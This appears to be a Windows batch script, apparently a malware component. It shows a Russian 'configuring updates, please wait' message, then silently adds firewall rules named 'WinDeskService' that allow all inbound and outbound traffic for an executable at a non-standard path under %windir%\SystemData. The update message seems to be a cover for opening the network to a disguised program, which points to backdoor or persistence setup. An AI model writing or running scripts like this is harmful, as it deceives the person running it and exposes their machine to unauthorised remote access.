@echo off
chcp 65001
cls
@echo Настройка обновлений... Пожалуйста подождите.
netsh advfirewall firewall add rule name="WinDeskService" dir=out program="%windir%\SystemData\DesktopHost\DesktopService" profile=any action=allow>nul
netsh advfirewall firewall add rule name="WinDeskService" dir=in program="%windir%\SystemData\DesktopHost\DesktopService" profile=any action=allow>nul
exit